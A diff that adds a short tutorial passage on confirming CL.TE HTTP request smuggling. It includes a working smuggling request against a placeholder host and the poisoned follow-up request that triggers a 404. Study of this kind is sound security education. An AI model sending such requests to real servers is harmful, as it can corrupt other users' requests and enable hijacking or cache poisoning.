@@ -1,0 +1,34 @@
+Confirming CL.TE vulnerabilities using differential responses
+To confirm a CL.TE vulnerability, you would send an attack request like this:
+
+"
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Transfer-Encoding: chunked
+
+e
+q=smuggling&x=
+0
+
+GET /404 HTTP/1.1
+Foo: x
+"
+
+If the attack is successful, then the last two lines of this request are treated by the back-end 
+server as belonging to the next request that is received. This will cause the subsequent "normal" 
+request to look like this:
+
+"
+GET /404 HTTP/1.1
+Foo: xPOST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+"
+
+Since this request now contains an invalid URL, the server will respond with status code 404, 
+indicating that the attack request did indeed interfere with it.
